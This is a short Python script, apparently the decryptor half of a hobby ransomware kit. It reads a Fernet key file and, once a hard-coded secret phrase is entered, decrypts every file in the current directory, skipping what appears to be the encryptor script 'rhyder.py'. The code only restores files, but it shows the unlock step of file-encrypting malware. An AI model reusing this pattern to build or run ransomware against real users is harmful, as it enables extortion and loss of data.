import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file in ["rhyder.py", "thekey.key", "decrypt.py"]:
        continue
    if os.path.isfile(file):
        files.append(file)
        
with open("thekey.key", "rb") as key:
    secretkey = key.read()
    
secretphrase = "coffee"

user_phrase = input("Enter the secret phrase to decrypt your files : ")
    
if user_phrase == secretphrase:
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_decrypted = Fernet(secretkey).decrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_decrypted)
else:
    print("Wrong secret phrase.")